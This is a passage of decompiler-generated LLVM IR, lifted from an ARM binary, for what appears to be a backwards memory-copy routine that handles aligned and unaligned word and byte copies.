  %v8_15a28 = inttoptr i32 %v7_15a28 to i32*
  store i32 %v9_15a24, i32* %v8_15a28, align 4
  %v10_15a28 = add i32 %v6_15a28, -12
  %v11_15a28 = inttoptr i32 %v10_15a28 to i32*
  %v12_15a28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15a28, i32* %v11_15a28, align 4
  %v13_15a28 = add i32 %v6_15a28, -8
  %v14_15a28 = inttoptr i32 %v13_15a28 to i32*
  %v15_15a28 = load i32, i32* @ip, align 4
  store i32 %v15_15a28, i32* %v14_15a28, align 4
  %v16_15a28 = add i32 %v6_15a28, -4
  %v17_15a28 = inttoptr i32 %v16_15a28 to i32*
  %v18_15a28 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15a28, i32* %v17_15a28, align 4
  store i32 %v7_15a28, i32* %r0.global-to-local, align 4
  %v6_15a2c = load i32, i32* %r2.global-to-local, align 4
  %v7_15a2c = add i32 %v6_15a2c, -16
  store i32 %v7_15a2c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15a20, %bb147
  %v6_15a38 = phi i32 [ %v7_15a28, %bb147 ], [ %v6_15a28, %dec_label_pc_15a20 ]
  %v0_15a30 = phi i32 [ %v7_15a2c, %bb147 ], [ %v0_15a30.pr, %dec_label_pc_15a20 ]
  %v4_15a30 = add i32 %v0_15a30, 20
  store i32 %v4_15a30, i32* %r2.global-to-local, align 4
  %v6_15a30 = sub i32 0, %v0_15a30
  %v7_15a30 = and i32 %v4_15a30, %v6_15a30
  %v8_15a30 = icmp slt i32 %v7_15a30, 0
  store i1 %v8_15a30, i1* %cpsr_v.global-to-local, align 1
  %v9_15a30 = icmp slt i32 %v4_15a30, 0
  store i1 %v9_15a30, i1* %cpsr_n.global-to-local, align 1
  %v10_15a30 = icmp eq i32 %v4_15a30, 0
  store i1 %v10_15a30, i1* %cpsr_z.global-to-local, align 1
  %v5_15a34 = icmp slt i32 %v0_15a30, -20
  br i1 %v5_15a34, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15a34 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a34 = add i32 %v6_15a34, -4
  %v8_15a34 = inttoptr i32 %v7_15a34 to i32*
  %v9_15a34 = load i32, i32* %v8_15a34, align 4
  store i32 %v9_15a34, i32* @r3, align 4
  %v10_15a34 = add i32 %v6_15a34, -8
  %v11_15a34 = inttoptr i32 %v10_15a34 to i32*
  %v12_15a34 = load i32, i32* %v11_15a34, align 4
  store i32 %v12_15a34, i32* @ip, align 4
  %v13_15a34 = add i32 %v6_15a34, -12
  %v14_15a34 = inttoptr i32 %v13_15a34 to i32*
  %v15_15a34 = load i32, i32* %v14_15a34, align 4
  store i32 %v15_15a34, i32* %lr.global-to-local, align 4
  store i32 %v13_15a34, i32* %r1.global-to-local, align 4
  %v7_15a38 = add i32 %v6_15a38, -12
  %v8_15a38 = inttoptr i32 %v7_15a38 to i32*
  store i32 %v9_15a34, i32* %v8_15a38, align 4
  %v10_15a38 = add i32 %v6_15a38, -8
  %v11_15a38 = inttoptr i32 %v10_15a38 to i32*
  %v12_15a38 = load i32, i32* @ip, align 4
  store i32 %v12_15a38, i32* %v11_15a38, align 4
  %v13_15a38 = add i32 %v6_15a38, -4
  %v14_15a38 = inttoptr i32 %v13_15a38 to i32*
  %v15_15a38 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15a38, i32* %v14_15a38, align 4
  store i32 %v7_15a38, i32* %r0.global-to-local, align 4
  %v6_15a3c = load i32, i32* %r2.global-to-local, align 4
  %v7_15a3c = add i32 %v6_15a3c, -12
  store i32 %v7_15a3c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_15a5c45 = phi i32 [ %v6_15a38, %.thread2 ], [ %v7_15a38, %bb148 ]
  %v0_15a4443 = phi i32 [ %v4_15a30, %.thread2 ], [ %v7_15a3c, %bb148 ]
  %v2_15a40 = load i8*, i8** %stack_var_-8, align 4
  %v3_15a40 = ptrtoint i8* %v2_15a40 to i32
  store i32 %v3_15a40, i32* @r4, align 4
  store i32 %v8_159fc, i32* @lr, align 4
  br label %dec_label_pc_15a44

dec_label_pc_15a44:                               ; preds = %dec_label_pc_159f4, %.thread4
  %v7_15a54 = phi i32 [ %v0_15a0c37, %dec_label_pc_159f4 ], [ %v6_15a5c45, %.thread4 ]
  %v0_15a44 = phi i32 [ %v2_159f4, %dec_label_pc_159f4 ], [ %v0_15a4443, %.thread4 ]
  %v2_15a44 = add i32 %v0_15a44, 8
  store i32 %v2_15a44, i32* %r2.global-to-local, align 4
  %v4_15a44 = sub i32 0, %v0_15a44
  %v5_15a44 = and i32 %v2_15a44, %v4_15a44
  %v6_15a44 = icmp slt i32 %v5_15a44, 0
  store i1 %v6_15a44, i1* %cpsr_v.global-to-local, align 1
  %v7_15a44 = icmp slt i32 %v2_15a44, 0
  store i1 %v7_15a44, i1* %cpsr_n.global-to-local, align 1
  %v8_15a44 = icmp eq i32 %v2_15a44, 0
  store i1 %v8_15a44, i1* %cpsr_z.global-to-local, align 1
  %v5_15a48 = icmp slt i32 %v0_15a44, -8
  br i1 %v5_15a48, label %bb150, label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a44
  %v6_15a4c = add i32 %v0_15a44, 4
  store i32 %v6_15a4c, i32* %r2.global-to-local, align 4
  %v8_15a4c = sub i32 -5, %v0_15a44
  %v9_15a4c = and i32 %v8_15a4c, %v2_15a44
  %v10_15a4c = icmp slt i32 %v9_15a4c, 0
  store i1 %v10_15a4c, i1* %cpsr_v.global-to-local, align 1
  %v11_15a4c = icmp slt i32 %v6_15a4c, 0
  store i1 %v11_15a4c, i1* %cpsr_n.global-to-local, align 1
  %v12_15a4c = icmp eq i32 %v2_15a44, 4
  store i1 %v12_15a4c, i1* %cpsr_z.global-to-local, align 1
  %v5_15a50 = icmp slt i32 %v2_15a44, 4
  %v6_15a50 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a50 = add i32 %v6_15a50, -4
  %v8_15a50 = inttoptr i32 %v7_15a50 to i32*
  %v9_15a50 = load i32, i32* %v8_15a50, align 4
  store i32 %v9_15a50, i32* @r3, align 4
  br i1 %v5_15a50, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_15a4c
  store i32 %v7_15a50, i32* %r1.global-to-local, align 4
  %v8_15a54 = add i32 %v7_15a54, -4
  %v9_15a54 = inttoptr i32 %v8_15a54 to i32*
  store i32 %v9_15a50, i32* %v9_15a54, align 4
  %v10_15a54 = load i32, i32* %r0.global-to-local, align 4
  %v11_15a54 = add i32 %v10_15a54, -4
  store i32 %v11_15a54, i32* %r0.global-to-local, align 4
  %v0_15a64.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_15a4c
  %v10_15a58 = add i32 %v6_15a50, -8
  %v11_15a58 = inttoptr i32 %v10_15a58 to i32*
  %v12_15a58 = load i32, i32* %v11_15a58, align 4
  store i32 %v12_15a58, i32* @ip, align 4
  store i32 %v10_15a58, i32* %r1.global-to-local, align 4
  %v7_15a5c = add i32 %v7_15a54, -8
  %v8_15a5c = inttoptr i32 %v7_15a5c to i32*
  store i32 %v9_15a50, i32* %v8_15a5c, align 4
  %v10_15a5c = add i32 %v7_15a54, -4
  %v11_15a5c = inttoptr i32 %v10_15a5c to i32*
  %v12_15a5c = load i32, i32* @ip, align 4
  store i32 %v12_15a5c, i32* %v11_15a5c, align 4
  store i32 %v7_15a5c, i32* %r0.global-to-local, align 4
  %v6_15a60 = load i32, i32* %r2.global-to-local, align 4
  %v7_15a60 = add i32 %v6_15a60, -4
  store i32 %v7_15a60, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_15a44, %dec_label_pc_159d4, %dec_label_pc_15c08, %dec_label_pc_15b9c, %dec_label_pc_15b30, %bb149
  %v2_15a68 = phi i32 [ %v11_15a54, %.thread8 ], [ %v0_15b0020, %.thread14 ], [ %v7_15a54, %dec_label_pc_15a44 ], [ %v2_159d8, %dec_label_pc_159d4 ], [ %v2_15a7453, %dec_label_pc_15c08 ], [ %v2_15a7452, %dec_label_pc_15b9c ], [ %v2_15a7451, %dec_label_pc_15b30 ], [ %v7_15a5c, %bb149 ]
  %v0_15a64 = phi i32 [ %v0_15a64.pre, %.thread8 ], [ %v2_15aa8, %.thread14 ], [ %v2_15a44, %dec_label_pc_15a44 ], [ %v2_159dc, %dec_label_pc_159d4 ], [ %v0_15a6449, %dec_label_pc_15c08 ], [ %v0_15a6448, %dec_label_pc_15b9c ], [ %v0_15a6447, %dec_label_pc_15b30 ], [ %v7_15a60, %bb149 ]
  %v1_15a64 = add i32 %v0_15a64, 4
  store i32 %v1_15a64, i32* %r2.global-to-local, align 4
  %v3_15a64 = sub i32 0, %v0_15a64
  %v4_15a64 = and i32 %v1_15a64, %v3_15a64
  %v5_15a64 = icmp slt i32 %v4_15a64, 0
  store i1 %v5_15a64, i1* %cpsr_v.global-to-local, align 1
  %v6_15a64 = icmp slt i32 %v1_15a64, 0
  store i1 %v6_15a64, i1* %cpsr_n.global-to-local, align 1
  %v7_15a64 = icmp eq i32 %v1_15a64, 0
  store i1 %v7_15a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15a64, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_15a6c = add i32 %v0_15a64, 2
  %v3_15a6c = sub i32 -3, %v0_15a64
  %v4_15a6c = and i32 %v3_15a6c, %v1_15a64
  %v5_15a6c = icmp slt i32 %v4_15a6c, 0
  store i1 %v5_15a6c, i1* %cpsr_v.global-to-local, align 1
  %v6_15a6c = icmp slt i32 %v1_15a6c, 0
  store i1 %v6_15a6c, i1* %cpsr_n.global-to-local, align 1
  %v7_15a6c = icmp eq i32 %v1_15a64, 2
  store i1 %v7_15a6c, i1* %cpsr_z.global-to-local, align 1
  %v0_15a70 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a70 = add i32 %v0_15a70, -1
  %v2_15a70 = inttoptr i32 %v1_15a70 to i8*
  %v3_15a70 = load i8, i8* %v2_15a70, align 1
  %v4_15a70 = zext i8 %v3_15a70 to i32
  store i32 %v4_15a70, i32* @r3, align 4
  store i32 %v1_15a70, i32* %r1.global-to-local, align 4
  %v3_15a74 = add i32 %v2_15a68, -1
  %v4_15a74 = inttoptr i32 %v3_15a74 to i8*
  store i8 %v3_15a70, i8* %v4_15a74, align 1
  %v5_15a74 = load i32, i32* %r0.global-to-local, align 4
  %v6_15a74 = add i32 %v5_15a74, -1
  store i32 %v6_15a74, i32* %r0.global-to-local, align 4
  %v0_15a78 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15a78 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15a78 = xor i1 %v0_15a78, %v1_15a78
  br i1 %v2_15a78, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_15a78 = load i32, i32* %r1.global-to-local, align 4
  %v4_15a78 = add i32 %v3_15a78, -1
  %v5_15a78 = inttoptr i32 %v4_15a78 to i8*
  %v6_15a78 = load i8, i8* %v5_15a78, align 1
  %v7_15a78 = zext i8 %v6_15a78 to i32
  store i32 %v7_15a78, i32* @r3, align 4
  store i32 %v4_15a78, i32* %r1.global-to-local, align 4
  %v6_15a7c = add i32 %v5_15a74, -2
  %v7_15a7c = inttoptr i32 %v6_15a7c to i8*
  store i8 %v6_15a78, i8* %v7_15a7c, align 1
  %v8_15a7c = load i32, i32* %r0.global-to-local, align 4
  %v9_15a7c = add i32 %v8_15a7c, -1
  store i32 %v9_15a7c, i32* %r0.global-to-local, align 4
  %v1_15a80.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15a80.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_15a84 = phi i32 [ %v9_15a7c, %bb152 ], [ %v6_15a74, %bb151 ]
  %v2_15a84 = phi i1 [ %v2_15a80.pre, %bb152 ], [ %v1_15a78, %bb151 ]
  %v1_15a84 = phi i1 [ %v1_15a80.pre, %bb152 ], [ %v0_15a78, %bb151 ]
  %v0_15a80 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15a80 = xor i1 %v2_15a84, %v1_15a84
  %v4_15a80 = or i1 %v0_15a80, %v3_15a80
  br i1 %v4_15a80, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_15a80 = load i32, i32* %r1.global-to-local, align 4
  %v6_15a80 = add i32 %v5_15a80, -1
  %v7_15a80 = inttoptr i32 %v6_15a80 to i8*
  %v8_15a80 = load i8, i8* %v7_15a80, align 1
  %v9_15a80 = zext i8 %v8_15a80 to i32
  store i32 %v9_15a80, i32* @r3, align 4
  store i32 %v6_15a80, i32* %r1.global-to-local, align 4
  %v8_15a84 = add i32 %v7_15a84, -1
  %v9_15a84 = inttoptr i32 %v8_15a84 to i8*
  store i8 %v8_15a80, i8* %v9_15a84, align 1
  %v10_15a84 = load i32, i32* %r0.global-to-local, align 4
  %v11_15a84 = add i32 %v10_15a84, -1
  store i32 %v11_15a84, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_159e4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15a8c = icmp eq i32 %v1_159e4, 1
  store i1 %v8_15a8c, i1* %cpsr_n.global-to-local, align 1
  %v9_15a8c = icmp eq i32 %v1_159e4, 2
  store i1 %v9_15a8c, i1* %cpsr_z.global-to-local, align 1
  %v1_15a90 = add i32 %v2_159d4, -1
  %v2_15a90 = inttoptr i32 %v1_15a90 to i8*
  %v3_15a90 = load i8, i8* %v2_15a90, align 1
  %v4_15a90 = zext i8 %v3_15a90 to i32
  store i32 %v4_15a90, i32* @r3, align 4
  store i32 %v1_15a90, i32* %r1.global-to-local, align 4
  %v3_15a94 = add i32 %v2_159d8, -1
  %v4_15a94 = inttoptr i32 %v3_15a94 to i8*
  store i8 %v3_15a90, i8* %v4_15a94, align 1
  %v5_15a94 = load i32, i32* %r0.global-to-local, align 4
  %v6_15a94 = add i32 %v5_15a94, -1
  store i32 %v6_15a94, i32* %r0.global-to-local, align 4
  br i1 %v8_15a8c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_15a8c
  %v6_15a98 = load i32, i32* %r1.global-to-local, align 4
  %v7_15a98 = add i32 %v6_15a98, -1
  %v8_15a98 = inttoptr i32 %v7_15a98 to i8*
  %v9_15a98 = load i8, i8* %v8_15a98, align 1
  %v10_15a98 = zext i8 %v9_15a98 to i32
  store i32 %v10_15a98, i32* @r3, align 4
  store i32 %v7_15a98, i32* %r1.global-to-local, align 4
  %v9_15a9c = add i32 %v5_15a94, -2
  %v10_15a9c = inttoptr i32 %v9_15a9c to i8*
  store i8 %v9_15a98, i8* %v10_15a9c, align 1
  %v11_15a9c = load i32, i32* %r0.global-to-local, align 4
  %v12_15a9c = add i32 %v11_15a9c, -1
  store i32 %v12_15a9c, i32* %r0.global-to-local, align 4
  br i1 %v9_15a8c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_15aa0 = load i32, i32* %r1.global-to-local, align 4
  %v9_15aa0 = add i32 %v8_15aa0, -1
  %v10_15aa0 = inttoptr i32 %v9_15aa0 to i8*
  %v11_15aa0 = load i8, i8* %v10_15aa0, align 1
  %v12_15aa0 = zext i8 %v11_15aa0 to i32
  store i32 %v12_15aa0, i32* @r3, align 4
  store i32 %v9_15aa0, i32* %r1.global-to-local, align 4
  %v11_15aa4 = add i32 %v11_15a9c, -2
  %v12_15aa4 = inttoptr i32 %v11_15aa4 to i8*
  store i8 %v11_15aa0, i8* %v12_15aa4, align 1
  %v13_15aa4 = load i32, i32* %r0.global-to-local, align 4
  %v14_15aa4 = add i32 %v13_15aa4, -1
  store i32 %v14_15aa4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_15a8c, %bb155
  %v0_15b0020 = phi i32 [ %v12_15a9c, %bb154 ], [ %v6_15a94, %dec_label_pc_15a8c ], [ %v14_15aa4, %bb155 ]
  %v0_15aa8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15aa8 = load i32, i32* @ip, align 4
  %v2_15aa8 = sub i32 %v0_15aa8, %v1_15aa8
  store i32 %v2_15aa8, i32* %r2.global-to-local, align 4
  %v4_15aa8 = xor i32 %v1_15aa8, %v0_15aa8
  %v5_15aa8 = xor i32 %v2_15aa8, %v0_15aa8
  %v6_15aa8 = and i32 %v5_15aa8, %v4_15aa8
  %v7_15aa8 = icmp slt i32 %v6_15aa8, 0
  store i1 %v7_15aa8, i1* %cpsr_v.global-to-local, align 1
  %v8_15aa8 = icmp slt i32 %v2_15aa8, 0
  store i1 %v8_15aa8, i1* %cpsr_n.global-to-local, align 1
  %v9_15aa8 = icmp eq i32 %v0_15aa8, %v1_15aa8
  store i1 %v9_15aa8, i1* %cpsr_z.global-to-local, align 1
  %v5_15aac = icmp slt i32 %v0_15aa8, %v1_15aa8
  br i1 %v5_15aac, label %bb150, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %.thread14
  %v0_15ab0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ab0 = urem i32 %v0_15ab0, 4
  store i32 %v1_15ab0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15ab0 = icmp eq i32 %v1_15ab0, 0
  store i1 %v2_15ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ab0, label %dec_label_pc_159f4, label %dec_label_pc_15ab8

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_159ec, %dec_label_pc_15ab0
  %v0_15b0019 = phi i32 [ %v2_159d8, %dec_label_pc_159ec ], [ %v0_15b0020, %dec_label_pc_15ab0 ]
  %v0_15bac = phi i32 [ %v2_159dc, %dec_label_pc_159ec ], [ %v2_15aa8, %dec_label_pc_15ab0 ]
  %v0_15ab8 = phi i32 [ %v2_159d4, %dec_label_pc_159ec ], [ %v0_15ab0, %dec_label_pc_15ab0 ]
  %v0_15ac0 = phi i32 [ %v1_159ec, %dec_label_pc_159ec ], [ %v1_15ab0, %dec_label_pc_15ab0 ]
  %v1_15ab8 = and i32 %v0_15ab8, -4
  store i32 %v1_15ab8, i32* %r1.global-to-local, align 4
  %v1_15abc = inttoptr i32 %v1_15ab8 to i32*
  %v2_15abc = load i32, i32* %v1_15abc, align 4
  store i32 %v2_15abc, i32* @r3, align 4
  %v7_15ac0 = icmp ult i32 %v0_15ac0, 2
  %v2_15ba4 = add i32 %v0_15bac, -12
  %v4_15ba4 = sub i32 11, %v0_15bac
  %v5_15ba4 = and i32 %v4_15ba4, %v0_15bac
  %v6_15ba4 = icmp slt i32 %v5_15ba4, 0
  store i1 %v6_15ba4, i1* %cpsr_v.global-to-local, align 1
  %v7_15ba4 = icmp slt i32 %v2_15ba4, 0
  store i1 %v7_15ba4, i1* %cpsr_n.global-to-local, align 1
  %v8_15ba4 = icmp eq i32 %v0_15bac, 12
  store i1 %v8_15ba4, i1* %cpsr_z.global-to-local, align 1
  %v5_15ba8 = icmp slt i32 %v0_15bac, 12
  br i1 %v7_15ac0, label %dec_label_pc_15ba4, label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15ab8
  %v8_15ac0 = icmp eq i32 %v0_15ac0, 2
  br i1 %v8_15ac0, label %dec_label_pc_15b38, label %dec_label_pc_15acc

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15ac8
  br i1 %v5_15ba8, label %dec_label_pc_15b18, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15acc
  store i32 %v2_15ba4, i32* %r2.global-to-local, align 4
  %v3_15ad8 = load i32, i32* @r4, align 4
  store i32 %v3_15ad8, i32* %stack_var_-12, align 4
  %v6_15ad8 = load i32, i32* @r5, align 4
  %v8_15ad8 = inttoptr i32 %v6_15ad8 to i8*
  store i8* %v8_15ad8, i8** %stack_var_-8, align 4
  %v11_15ad8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15adc.dec_label_pc_15adc_crit_edge, %dec_label_pc_15ad4
  %v0_15b00 = phi i32 [ %v1_15b00, %dec_label_pc_15adc.dec_label_pc_15adc_crit_edge ], [ %v0_15b0019, %dec_label_pc_15ad4 ]
  %v0_15ae0 = phi i32 [ %v0_15ae0.pre, %dec_label_pc_15adc.dec_label_pc_15adc_crit_edge ], [ %v1_15ab8, %dec_label_pc_15ad4 ]
  %v0_15adc = phi i32 [ %v0_15adc.pre, %dec_label_pc_15adc.dec_label_pc_15adc_crit_edge ], [ %v2_15abc, %dec_label_pc_15ad4 ]
  %v3_15adc = mul i32 %v0_15adc, 256
  store i32 %v3_15adc, i32* %lr.global-to-local, align 4
  %v1_15ae0 = add i32 %v0_15ae0, -4
  %v2_15ae0 = inttoptr i32 %v1_15ae0 to i32*
  %v3_15ae0 = load i32, i32* %v2_15ae0, align 4
  store i32 %v3_15ae0, i32* @r3, align 4
  %v4_15ae0 = add i32 %v0_15ae0, -8
  %v5_15ae0 = inttoptr i32 %v4_15ae0 to i32*
  %v6_15ae0 = load i32, i32* %v5_15ae0, align 4
  store i32 %v6_15ae0, i32* %r4.global-to-local, align 4
  %v7_15ae0 = add i32 %v0_15ae0, -12
  %v8_15ae0 = inttoptr i32 %v7_15ae0 to i32*
  %v9_15ae0 = load i32, i32* %v8_15ae0, align 4
  store i32 %v9_15ae0, i32* %r5.global-to-local, align 4
  %v10_15ae0 = add i32 %v0_15ae0, -16
  %v11_15ae0 = inttoptr i32 %v10_15ae0 to i32*
  %v12_15ae0 = load i32, i32* %v11_15ae0, align 4
  store i32 %v10_15ae0, i32* %r1.global-to-local, align 4
  %v4_15ae4 = udiv i32 %v12_15ae0, 16777216
  %v5_15ae4 = or i32 %v4_15ae4, %v3_15adc
  store i32 %v5_15ae4, i32* %lr.global-to-local, align 4
  %v3_15ae8 = mul i32 %v12_15ae0, 256
  %v4_15aec = udiv i32 %v9_15ae0, 16777216
  %v5_15aec = or i32 %v3_15ae8, %v4_15aec
  store i32 %v5_15aec, i32* @ip, align 4
  %v3_15af0 = mul i32 %v9_15ae0, 256
  %v4_15af4 = udiv i32 %v6_15ae0, 16777216
  %v5_15af4 = or i32 %v3_15af0, %v4_15af4
  store i32 %v5_15af4, i32* %r5.global-to-local, align 4
  %v3_15af8 = mul i32 %v6_15ae0, 256
  %v4_15afc = udiv i32 %v3_15ae0, 16777216
  %v5_15afc = or i32 %v3_15af8, %v4_15afc
  store i32 %v5_15afc, i32* %r4.global-to-local, align 4
  %v1_15b00 = add i32 %v0_15b00, -16
  %v2_15b00 = inttoptr i32 %v1_15b00 to i32*
  store i32 %v5_15afc, i32* %v2_15b00, align 4
  %v4_15b00 = add i32 %v0_15b00, -12
  %v5_15b00 = inttoptr i32 %v4_15b00 to i32*
  %v6_15b00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15b00, i32* %v5_15b00, align 4
  %v7_15b00 = add i32 %v0_15b00, -8
  %v8_15b00 = inttoptr i32 %v7_15b00 to i32*
  %v9_15b00 = load i32, i32* @ip, align 4
  store i32 %v9_15b00, i32* %v8_15b00, align 4
  %v10_15b00 = add i32 %v0_15b00, -4
  %v11_15b00 = inttoptr i32 %v10_15b00 to i32*
  %v12_15b00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b00, i32* %v11_15b00, align 4
  store i32 %v1_15b00, i32* %r0.global-to-local, align 4
  %v0_15b04 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b04 = add i32 %v0_15b04, -16
  store i32 %v2_15b04, i32* %r2.global-to-local, align 4
  %v6_15b08 = icmp slt i32 %v0_15b04, 16
  br i1 %v6_15b08, label %dec_label_pc_15b0c, label %dec_label_pc_15adc.dec_label_pc_15adc_crit_edge

dec_label_pc_15adc.dec_label_pc_15adc_crit_edge:  ; preds = %dec_label_pc_15adc
  %v0_15adc.pre = load i32, i32* @r3, align 4
  %v0_15ae0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15adc
  %v2_15b0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15b0c, i32* @r4, align 4
  %v5_15b0c = load i8*, i8** %stack_var_-8, align 4
  %v6_15b0c = ptrtoint i8* %v5_15b0c to i32
  store i32 %v6_15b0c, i32* @r5, align 4
  store i32 %v11_15ad8, i32* @lr, align 4
  %v2_15b10 = add i32 %v0_15b04, -4
  store i32 %v2_15b10, i32* %r2.global-to-local, align 4
  %v4_15b10 = add i32 %v0_15b04, 2147483632
  %v5_15b10 = and i32 %v2_15b10, %v4_15b10
  %v6_15b10 = icmp slt i32 %v5_15b10, 0
  store i1 %v6_15b10, i1* %cpsr_v.global-to-local, align 1
  %v7_15b10 = icmp slt i32 %v2_15b10, 0
  store i1 %v7_15b10, i1* %cpsr_n.global-to-local, align 1
  %v8_15b10 = icmp eq i32 %v2_15b10, 0
  store i1 %v8_15b10, i1* %cpsr_z.global-to-local, align 1
  %v5_15b14 = icmp slt i32 %v2_15b04, -12
  br i1 %v5_15b14, label %dec_label_pc_15b30, label %dec_label_pc_15b18

dec_label_pc_15b18:                               ; preds = %dec_label_pc_15b0c, %dec_label_pc_15acc, %dec_label_pc_15b18
  %v1_15b24 = phi i32 [ %v5_15b24, %dec_label_pc_15b18 ], [ %v1_15b00, %dec_label_pc_15b0c ], [ %v0_15b0019, %dec_label_pc_15acc ]
  %v0_15b18 = load i32, i32* @r3, align 4
  %v3_15b18 = mul i32 %v0_15b18, 256
  store i32 %v3_15b18, i32* %ip.global-to-local, align 4
  %v0_15b1c = load i32, i32* %r1.global-to-local, align 4
  %v1_15b1c = add i32 %v0_15b1c, -4
  %v2_15b1c = inttoptr i32 %v1_15b1c to i32*
  %v3_15b1c = load i32, i32* %v2_15b1c, align 4
  store i32 %v3_15b1c, i32* @r3, align 4
  store i32 %v1_15b1c, i32* %r1.global-to-local, align 4
  %v4_15b20 = udiv i32 %v3_15b1c, 16777216
  %v5_15b20 = or i32 %v4_15b20, %v3_15b18
  store i32 %v5_15b20, i32* @ip, align 4
  %v2_15b24 = add i32 %v1_15b24, -4
  %v3_15b24 = inttoptr i32 %v2_15b24 to i32*
  store i32 %v5_15b20, i32* %v3_15b24, align 4
  %v4_15b24 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b24 = add i32 %v4_15b24, -4
  store i32 %v5_15b24, i32* %r0.global-to-local, align 4
  %v0_15b28 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b28 = add i32 %v0_15b28, -4
  store i32 %v2_15b28, i32* %r2.global-to-local, align 4
  %v6_15b2c = icmp slt i32 %v0_15b28, 4
  br i1 %v6_15b2c, label %dec_label_pc_15b30.loopexit, label %dec_label_pc_15b18

dec_label_pc_15b30.loopexit:                      ; preds = %dec_label_pc_15b18
  %v4_15b28 = sub i32 3, %v0_15b28
  %v5_15b28 = and i32 %v4_15b28, %v0_15b28
  %v6_15b28 = icmp slt i32 %v5_15b28, 0
  %v7_15b28 = icmp slt i32 %v2_15b28, 0
  store i1 %v6_15b28, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b28, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b30.loopexit, %dec_label_pc_15b0c
  %v2_15a7451 = phi i32 [ %v5_15b24, %dec_label_pc_15b30.loopexit ], [ %v1_15b00, %dec_label_pc_15b0c ]
  %v0_15a6447 = phi i32 [ %v2_15b28, %dec_label_pc_15b30.loopexit ], [ %v2_15b10, %dec_label_pc_15b0c ]
  %v0_15b30 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b30 = add i32 %v0_15b30, 3
  store i32 %v1_15b30, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15ac8
  br i1 %v5_15ba8, label %dec_label_pc_15b84, label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %dec_label_pc_15b38
  store i32 %v2_15ba4, i32* %r2.global-to-local, align 4
  %v3_15b44 = load i32, i32* @r4, align 4
  store i32 %v3_15b44, i32* %stack_var_-12, align 4
  %v6_15b44 = load i32, i32* @r5, align 4
  %v8_15b44 = inttoptr i32 %v6_15b44 to i8*
  store i8* %v8_15b44, i8** %stack_var_-8, align 4
  %v11_15b44 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15b48

dec_label_pc_15b48:                               ; preds = %dec_label_pc_15b48.dec_label_pc_15b48_crit_edge, %dec_label_pc_15b40
  %v0_15b6c = phi i32 [ %v1_15b6c, %dec_label_pc_15b48.dec_label_pc_15b48_crit_edge ], [ %v0_15b0019, %dec_label_pc_15b40 ]
  %v0_15b4c = phi i32 [ %v0_15b4c.pre, %dec_label_pc_15b48.dec_label_pc_15b48_crit_edge ], [ %v1_15ab8, %dec_label_pc_15b40 ]
  %v0_15b48 = phi i32 [ %v0_15b48.pre, %dec_label_pc_15b48.dec_label_pc_15b48_crit_edge ], [ %v2_15abc, %dec_label_pc_15b40 ]
  %v3_15b48 = mul i32 %v0_15b48, 65536
  store i32 %v3_15b48, i32* %lr.global-to-local, align 4
  %v1_15b4c = add i32 %v0_15b4c, -4
  %v2_15b4c = inttoptr i32 %v1_15b4c to i32*
